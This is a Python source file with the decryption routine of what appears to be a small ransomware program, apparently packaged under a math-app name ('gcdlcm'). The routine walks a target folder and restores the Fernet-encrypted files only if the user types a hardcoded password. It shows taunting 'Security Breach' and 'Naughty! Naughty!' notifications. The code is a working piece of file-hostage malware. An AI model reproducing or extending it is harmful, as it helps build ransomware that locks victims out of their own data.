from gcdlcm.app.__init__ import *

def decryption():
    files_list = []

    for root, dir, files in os.walk(target_folder):
        for file in files:
            if file in ["__init__.py", "secret.key", "secret.py", "README.md", "LICENSE.md"]:
                continue
            files_list.append(f'{root}/{file}')

    with open("secret.key", "rb") as f:
        key = f.read()

    password = "hack4tahsin"
    user_input = input("Enter password to decrypt: ")

    if password == user_input:
        for f in files_list:
            with open(f, "rb") as fi:
                data = fi.read()

            decrypted = Fernet(key).decrypt(data)

            with open(f, "wb") as fi:
                fi.write(decrypted)

        notification = Notification(app_id="Security Secured", title="Congratulation!",
                                    msg="You have been saved and got your file back. See you next time!")
        return notification.show()

    else:
        notification = Notification(app_id="Security Breach", title="Naughty! Naughty!",
                                    msg="You think you're smart enough to get your file back!")
        return notification.show()